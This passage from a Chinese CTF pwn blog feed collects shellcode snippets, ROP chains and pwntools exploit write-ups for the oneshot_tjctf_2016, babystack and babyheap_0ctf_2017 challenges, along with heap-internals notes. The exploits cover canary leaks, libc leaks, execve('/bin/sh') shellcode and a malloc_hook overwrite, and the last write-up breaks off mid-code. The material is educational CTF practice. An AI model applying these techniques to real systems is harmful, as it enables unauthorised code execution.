title="open_read_put"></a>open_read_put</h3><img src="2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/image-20200128101042088.png" srcset="/img/loading.gif" class="" title="image-20200128101042088"><pre><code class="python">    payload += p64(pop_rsi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(pop_rsi_ret)    payload += p64(0)    payload += p64(elf.plt[&#39;open&#39;])    payload += p64(pop_rdi_ret)    payload += p64(4)#?    payload += p64(pop_rsi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(elf.plt[&#39;puts&#39;])</code></pre><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h2><p>可参考<a href="http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/" target="_blank" rel="noopener">http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/</a></p><pre><code class="python">shellcode =&#39;&#39;&#39;xor    eax,eaxpush   eaxpush   0x68732f2f #//shpush   0x6e69622f # /binmov    ebx,espmov    ecx,eaxmov    edx,eaxmov    al,0xbint    0x80xor    eax,eaxinc    eaxint    0x80&#39;&#39;&#39;shellcode =asm(shellcode) #使用shellcraft.sh打不通，估计是因为太长了shell=&quot;sub esp,0x28;call esp&quot;shell =asm(shell)</code></pre><h2 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h2><pre><code class="python">push 0x67616c66mov rdi,rsp push 2pop raxxor rsi,rsipush 32pop rdxsyscallmov rdi,raxmov rsi,rspxor rax,raxsyscallpush 1pop rdipush 1pop raxsyscall</code></pre><pre><code class="python">push   0x42pop    raxinc    ahcqopush   rdxmovabs rdi, 0x68732f2f6e69622fpush   rdipush   rsppop    rsimov    r8, rdxmov    r10, rdxsyscal</code></pre><pre><code class="python">xor    %rsi,%rsipush   %rsimov $0x68732f2f6e69622f,%rdipush   %rdipush   %rsppop    %rdipush  $0x3bpop    %raxcltd   syscall </code></pre><h1 id="不那么熟悉的函数"><a href="#不那么熟悉的函数" class="headerlink" title="不那么熟悉的函数"></a>不那么熟悉的函数</h1><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>参数start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p><p>参数length：代表将文件中多大的部分映射到内存。</p><p>参数prot：映射区域的保护方式。可以为以下几种方式的组合：<br>PROT_EXEC       映射区域可被执行<br>PROT_READ       映射区域可被读取<br>PROT_WRITE     映射区域可被写入<br>PROT_NONE      映射区域不能存取</p><p>参数flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。<br>MAP_FIXED                如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。<br>MAP_SHARED          对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。<br>MAP_PRIVATE            对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。<br>MAP_ANONYMOUS  建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。<br>MAP_DENYWRITE   只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。<br>MAP_LOCKED          将映射区域锁定住，这表示该区域不会被置换（swap）。</p><p>参数fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p><p>参数offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。<br>————————————————<br>版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/yzy1103203312/article/details/78286360" target="_blank" rel="noopener">https://blog.csdn.net/yzy1103203312/article/details/78286360</a></p></blockquote><h1 id="短于68的ropchains"><a href="#短于68的ropchains" class="headerlink" title="短于68的ropchains"></a>短于68的ropchains</h1><pre><code class="python">from struct import pack p = lambda x : pack(&#39;I&#39;, x)IMAGE_BASE_0 = 0x08048000 # ./simpleroprebase_0 = lambda x : p(x + IMAGE_BASE_0)rop = &#39;&#39;rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; rop += &#39;/bin&#39;rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; rop += rebase_0(0x000a3060)rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; rop += &#39;/sh\x00&#39;rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; rop += rebase_0(0x000a3064)rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;rop += pack(&#39;I&#39;, pop_edx_ecx_ebx)rop += p(0)rop += p(0)rop += rebase_0(0x000a3060)rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; rop += p(0x0000000b)rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; </code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>oneshot_tjctf_2016</title>
    <link href="/2020/02/05/oneshot_tjctf_2016/"/>
    <url>/2020/02/05/oneshot_tjctf_2016/</url>
    
    <content type="html"><![CDATA[<h1 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h1><img src="2020/02/05/oneshot_tjctf_2016/image-20200205020208419.png" srcset="/img/loading.gif" class="" title="image-20200205020208419"><img src="2020/02/05/oneshot_tjctf_2016/image-20200205020146218.png" srcset="/img/loading.gif" class="" title="image-20200205020146218"><p>*v4，要用<code>str(elf.got[&#39;__libc_start_main&#39;])</code></p><p>接受要用<code>int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p>exp</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./oneshot_tjctf_2016&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./oneshot_tjctf_2016&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#39;)    payload = str(elf.got[&#39;__libc_start_main&#39;])    pause()    sh.sendline(payload)    sh.recvuntil(&quot;0x0000&quot;)    __libc_start_main = int(sh.recvuntil(&quot;\n&quot;,True),16)    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    one_gadget = 0xf1147     payload = str( libc  + one_gadget)    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,29303,0)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>leak_canary-others_babystack</title>
    <link href="/2020/02/04/leak_canary-others_babystack/"/>
    <url>/2020/02/04/leak_canary-others_babystack/</url>
    
    <content type="html"><![CDATA[<h1 id="leak-canary-others-babystack"><a href="#leak-canary-others-babystack" class="headerlink" title="leak_canary-others_babystack"></a>leak_canary-others_babystack</h1><img src="2020/02/04/leak_canary-others_babystack/image-20200204230127839.png" srcset="/img/loading.gif" class="" title="image-20200204230127839"><p>Full RELRO GOT表只读</p><img src="2020/02/04/leak_canary-others_babystack/image-20200204230141663.png" srcset="/img/loading.gif" class="" title="image-20200204230141663"><p>s申请的是0x80，但读入0x100。并且canary在stack -0x8的地方</p><p>先泄露canary，puts函数在输出时，只有遇到\x00才会结束，用\n覆盖canary的第一字节\x00，从而获得canary</p><p><code>payload = cyclic(0x90-0x8)</code></p><img src="2020/02/04/leak_canary-others_babystack/image-20200204230829836.png" srcset="/img/loading.gif" class="" title="image-20200204230829836"><pre><code class="python">sh.recvuntil(&quot;iaab\n&quot;)canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))log.success(&quot;canary------&gt;&quot; + hex(canary))</code></pre><p>然后构造payload</p><pre><code class="python">    def printf():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)    def quit():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)    payload = cyclic(0x90-0x8)    store(payload)    printf()    sh.recvuntil(&quot;iaab\n&quot;)    canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))    log.success(&quot;canary------&gt;&quot; + hex(canary))    payload = cyclic(0x90-0x8)    payload += p64(canary)    payload += cyclic(0x8)    payload += p64(pop_rdi_ret)    payload += p64(elf.got[&#39;__libc_start_main&#39;])    payload += p64(elf.plt[&#39;puts&#39;])    payload += p64(main)    store(payload)    quit()</code></pre><p><strong>必须要quit了才会继续运行到我们的溢出部分</strong></p><p>后面就是常规了</p><p>exp</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./babystack&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./babystack&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        #lib = ELF(&#39;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#39;)    pop_rdi_ret = 0x0400a93    main = 0x400908    def store(payload):        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)        sh.sendline(payload)    def printf():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)    def quit():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)    payload = cyclic(0x90-0x8)    store(payload)    printf()    sh.recvuntil(&quot;iaab\n&quot;)    canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))    log.success(&quot;canary------&gt;&quot; + hex(canary))    payload = cyclic(0x90-0x8)     payload += p64(canary)     payload += cyclic(0x8)    payload += p64(pop_rdi_ret)    payload += p64(elf.got[&#39;__libc_start_main&#39;])    payload += p64(elf.plt[&#39;puts&#39;])    payload += p64(main)    store(payload)    quit()    __libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    payload = cyclic(0x90-0x8)    payload += p64(canary)    payload += cyclic(0x8)    payload += p64(pop_rdi_ret)    payload += p64(binsh)    payload += p64(system)    store(payload)    quit()    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,25459,1 )</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux常见问题解决方法</title>
    <link href="/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p><pre><code class="shell">ps -A | grep aptsudo kill -9 processnumbersudo rm /var/lib/dpkg/locksudo rm /var/lib/dpkg/lock-frontend</code></pre><p>E: Could not get lock /var/cache/apt/archives/lock - open (11: Resource temporarily unavailable) </p><p>E: Unable to lock directory /var/cache/apt/archives/</p><pre><code class="bash">sudo killall apt-getsudo rm /var/lib/apt/lists/locksudo rm /var/cache/apt/archives/locksudo rm /var/lib/dpkg/lock</code></pre>]]></content>
    
    
    <categories>
      
      <category>Linux使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 问题解决</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN 环境搭建清单</title>
    <link href="/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/"/>
    <url>/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN-环境搭建清单"><a href="#PWN-环境搭建清单" class="headerlink" title="PWN 环境搭建清单"></a>PWN 环境搭建清单</h1><h2 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h2><p>ubuntu18、16</p><p>pwntools </p><p>edb 调试栈好</p><p>vim</p><p>libcsearcher</p><p>pwndbg 调试堆好</p><p>seccomp-tools 查看seccomp</p><p>proxychains4 apt get的快</p><h2 id="WIN-MAC"><a href="#WIN-MAC" class="headerlink" title="WIN/MAC"></a>WIN/MAC</h2><p>IDA 反汇编</p><p>die 查看32/64 和壳等</p><p><a href="http://mrbelieve.tech/2019/12/23/Pwn常用指令/" target="_blank" rel="noopener">一些常用指令</a></p><p><a href="[https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/#0x05-get-started-3dsctf-2016](https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/#0x05-get-started-3dsctf-2016">可供参考exp from 南梦</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN环境搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆的基础知识</title>
    <link href="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><ul><li>修改某个函数的got表 为 system 的地址,然后参数准备为binsh 就可以</li><li>修改free函数为puts函数,然后某个堆里参数准备为某个函数的got表地址 就可以泄露地址了</li><li>one_gadget</li></ul><p>来源：<a href="https://www.anquanke.com/post/id/163971" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163971</a></p><p><strong>在 64 位程序中：</strong></p><pre><code>malloc(8)</code></pre><p>申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21</p><p>1.第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</p><ul><li>在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节</li><li>例如，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li></ul><p>2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）<br>3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）<br>4.最后一个 1 字节是 <strong>PREV_INUSE 的值，只有 0 或 1两个值</strong></p><hr><p>1.pre size 字段。<strong>只有在前面一个堆块是空闲的时候才有指</strong>，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0<br>2.size 字段。是用来指示当前堆块的大小的（头部加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。</p><p>这三位的作用分别是：</p><pre><code>1.NON_MAIN_ARENA     这个堆块是否位于主线程2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的3.PREV_INUSE         记录前一个 chunk 块是否被分配</code></pre><p>这里重点讲解最后一位：<strong>用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1</strong>，所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节。</p><ul><li>所以前一个堆块的释放与否都和这两个字段（pre_size、size）的值有关，这是因为便于内存的释放操作（free）</li><li>user data 顾名思义就是用来存放用户数据的。</li></ul><h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>就算只申请10字节，内核也会分配132KB堆空间给ptmalloc2，用完内核再分配132KB。因为是主线程分配的，所以这个区域叫做 main arena。</p><p>==x/2gx &amp;main_arena==</p><p><strong>32位的程序使用 x/32xw  addr比较直观一点</strong></p><p><strong>64位的程序使用 x/64xw  addr</strong></p><h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>堆中第一个堆块,程序以后分配到的内存到要放在他的后面，就如下图的0x5578cbd73110（并且，堆向上生长</p><img src="2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214332010.png" srcset="/img/loading.gif" class="" title="image-20200131214332010"><blockquote><p>FD 指向链表中前一个堆块的指针，该指针指向的是chunk的head</p><p>BK 指向链表中后一个堆块的指针，该指针也是指向chunk的head，通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</p><p>FD_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>BK_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</p><p>作者：合天智汇<br>链接：<a href="https://www.jianshu.com/p/5263bdbe92e2" target="_blank" rel="noopener">https://www.jianshu.com/p/5263bdbe92e2</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><p>这里我把第二个和第三个都free了</p><h2 id="free-函数和-bins"><a href="#free-函数和-bins" class="headerlink" title="free 函数和 bins"></a>free 函数和 bins</h2><p>堆管理器会根据用户已经申请到的内存空间大小进行释放，<strong>来决定放入哪类 bins 当作去</strong>.</p><p>主要的 bins 分为以下几类，重点讲解 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。</p><p>调用 free 函数以后程序做了两件事：<br><strong>1.清空此堆块的 user data<br>2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</strong></p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>顾名思义，就是为了快速重新分配回内存而存在的一个结构。</p><blockquote><p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p></blockquote><p><strong>fast bin 的特性</strong></p><p><strong>1.使用单链表来维护释放的堆块</strong><br>也就是和上图一样，从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。</p><p>如下图所示，此时就是一个单链表结构</p><img src="2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214423497.png" srcset="/img/loading.gif" class="" title="image-20200131214423497"><p><strong>2.采用后进先出的方式维护链表（类似于栈的结构）</strong><br>当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，<strong>会选择后面新加入的堆块拿来先进行内存分配</strong></p><p>如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。</p><p><strong>这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块</strong>，此时 main_arena 就指向了这里。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。</p><p>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p></blockquote><ul><li><p>unsorted bin 与 fast bin 不同，他使用<strong>双向链表</strong>对 chunk 进行连接</p></li><li><p>unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。</p></li></ul><img src="2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131215053221.png" srcset="/img/loading.gif" class="" title="image-20200131215053221">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>babyheap_0ctf_2017</title>
    <link href="/2020/02/02/babyheap_0ctf_2017/"/>
    <url>/2020/02/02/babyheap_0ctf_2017/</url>
    
    <content type="html"><![CDATA[<h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>参考wp:<a href="https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2</a></p><img src="2020/02/02/babyheap_0ctf_2017/image-20200129165539077.png" srcset="/img/loading.gif" class="" title="image-20200129165539077"><pre><code>===== Baby Heap in 2017 =====1. AllocateCommand: 1Size: 300 Allocate Index 02. FillCommand: 2   Index: 0Size: 400Content: 3. FreeCommand: 3Index: 34. DumpCommand: 4Index: 05. Exit</code></pre><img src="2020/02/02/babyheap_0ctf_2017/image-20200129172302922.png" srcset="/img/loading.gif" class="" title="image-20200129172302922"><img src="2020/02/02/babyheap_0ctf_2017/image-20200129172208306.png" srcset="/img/loading.gif" class="" title="image-20200129172208306"><pre><code class="c">struct heap{    int ifExit;    int size;    char *str;}</code></pre><img src="2020/02/02/babyheap_0ctf_2017/image-20200129172221992.png" srcset="/img/loading.gif" class="" title="image-20200129172221992"><p>这里可以看见没有检查v4跟结构体里的size大小，并且是按照v4来输入的，这样就可以覆盖到下一块</p><img src="2020/02/02/babyheap_0ctf_2017/image-20200129172235026.png" srcset="/img/loading.gif" class="" title="image-20200129172235026"><p>都设置为了0，这样就不能<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/" target="_blank" rel="noopener">Use_after_free</a></p><img src="2020/02/02/babyheap_0ctf_2017/image-20200129172250382.png" srcset="/img/loading.gif" class="" title="image-20200129172250382"><p>先写好必须的四个功能</p><pre><code class="python">    def allocate(size):        sh.sendlineafter(&quot;Command:&quot;,&quot;1&quot;)        sh.sendlineafter(&quot;Size:&quot;,str(size))        sleep(0.1)    def fill(Index,payload):        sh.sendlineafter(&quot;Command:&quot;,&quot;2&quot;)        sh.sendlineafter(&quot;Index:&quot;,str(Index))        sh.sendlineafter(&quot;Size:&quot;,str(len(payload)))        sh.sendlineafter(&quot;Content:&quot;,str(payload))        sleep(0.1)    def free(Index):        sh.sendlineafter(&quot;Command:&quot;,&quot;3&quot;)        sh.sendlineafter(&quot;Index:&quot;,str(Index))        sleep(0.1)    def dump(Index):        sh.sendlineafter(&quot;Command:&quot;,&quot;3&quot;)        sh.sendlineafter(&quot;Index:&quot;,str(Index))        sleep(0.1)</code></pre><p>然后，先</p><pre><code class="python">add(0x10)     #0 0x00add(0x10)    #1 0x20add(0x10)    #2 0x40add(0x80)    #3 0x60gdb.attach(sh)heap</code></pre><img src="2020/02/02/babyheap_0ctf_2017/image-20200202114445460.png" srcset="/img/loading.gif" class="" title="image-20200202114445460"><pre><code class="python">free(2)    #0x40free(1)    #0x20</code></pre><img src="2020/02/02/babyheap_0ctf_2017/image-20200202114934969.png" srcset="/img/loading.gif" class="" title="image-20200202114934969"><p>然后，我们通过</p><pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+p8(0x60)    fill(0,payload)    #0x00</code></pre><img src="2020/02/02/babyheap_0ctf_2017/image-20200202115823555.png" srcset="/img/loading.gif" class="" title="image-20200202115823555"><p>在这里我们可以看见，由于没有限制输入长度，我们可以写入fd 8个a，bk 8个a， fd_nextsize p64(0)，bk_nextsize p64(0x21)，然后写入到下一块 我们本来已经free掉了的<code>0x20</code>中的 fd中，使他的指向 <code>0x60</code>的bin，这样我们看fastbins时就只能看见<code>0x20</code>和<code>0x60</code>了</p><img src="2020/02/02/babyheap_0ctf_2017/image-20200202121553155.png" srcset="/img/loading.gif" class="" title="image-20200202121553155"><pre><code class="python">allocate(0x10)    #1 0x20</code></pre>{% asset_img image-20200202122603540.png image-20200202122603540 %}<p>这样之后，我们的目的就达成了，把一块没有free的空间放入了fastbins中</p>{% asset_img image-20200202122724203.png image-20200202122724203 %}<pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x21)fill(1,payload) </code></pre><p>紧接着，我们把<code>0x40</code>的bk_nextsize 设为0x21,这样可以修改<code>0x60</code>的bin size为0x21(0x10 + 0x11)，绕过fastbin在分配内存的时候的检测</p><blockquote><p>BK_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</p></blockquote><p>再次<code>allocate(0x10)  #2 0x60</code>就会把之前的0x80的块分配出来</p><img src="2020/02/02/babyheap_0ctf_2017/image-20200202124220989.png" srcset="/img/loading.gif" class="" title="image-20200202124220989"><img src="2020/02/02/babyheap_0ctf_2017/image-20200202123933115.png" srcset="/img/loading.gif" class="" title="image-20200202123933115"><p>然后</p><pre><code class="python">payload = &#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;a&#39;*0x10+p64(0)+p64(0x91)fill(1,payload)  #1 0x20 还原#3的bin的size</code></pre><img src="2020/02/02/babyheap_0ctf_2017/image-20200202124141267.png" srcset="/img/loading.gif" class="" title="image-20200202124141267"><pre><code class="python">allocate(0x80)    #4        #为了让#3的bin不再挨着top chunk</code></pre>{% asset_img image-20200202132442146.png image-20200202132442146 %}<p>然后我们将<code>0x60    #3</code>free掉之后</p>{% asset_img image-20200202132625185.png image-20200202132625185 %}{% asset_img image-20200202181236041.png image-20200202181236041 %}<p>这样fd 和bk 都指向main_arena+88处</p><p>==然后为啥dump2呢-。-==</p><pre><code class="python">io.recvuntil(&#39;Content: \n&#39;)main_arena = u64(io.recv(6).ljust(8,&#39;\x00&#39;))-88log.success(&#39;main arena: &#39;+hex(main_arena))libc_base = main_arena - 0x3c4b20 log.success(&#39;libc base: &#39;+hex(libc_base))</code></pre><p>0x3c4b20 可以在对应的libc中，搜索malloc_trim函数，可以在下图的地方看见</p><img src="2020/02/02/babyheap_0ctf_2017/image-20200202182025461.png" srcset="/img/loading.gif" class="" title="image-20200202182025461"><p>也可以使用<a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">main_arena_offset</a> <code>main_arena libcaddr</code>获取</p><p>Arbitrary Alloc的例行公事，最终修改malloc_hook的内容为one_gadget</p><pre><code class="python">one_gadget = libc_base + 0x4526a allocate(0x60)    #3        free(3)                    fake_chunk_addr = main_arena - 0x33        payload = p64(fake_chunk_addr)fill(2,payload)</code></pre><p>0x33</p><blockquote><p><code>p &amp;main_arena</code></p><p><code>$1 = (struct malloc_state *) 0x7f5081821b20 &lt;main_arena&gt;</code></p><p><code>x/10gx main_arena_addr-0x10</code></p><p><code>0x7f5081821b10 &lt;__malloc_hook&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b20 &lt;main_arena&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b30 &lt;main_arena+16&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b40 &lt;main_arena+32&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b50 &lt;main_arena+48&gt;:    0x0000000000000000    0x0000000000000000</code></p><p><code>find_fake_fast __malloc_hook_addr 0x70</code></p><p><code>FAKE CHUNKS0x7f5081821aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA { prev_size = 5801060741742067712,  size = 127,  fd = 0x50814e2e20000000,  bk = 0x50814e2a0000007f,  fd_nextsize = 0x7f,  bk_nextsize = 0x0}</code></p><p>计算偏移</p><p><code>p/x main_arena_addr - fake_chunks_addr</code></p></blockquote><img src="2020/02/02/babyheap_0ctf_2017/image-20200202193142303.png" srcset="/img/loading.gif" class="" title="image-20200202193142303"><pre><code class="python">allocate(0x60)    #3allocate(0x60)    #5payload = 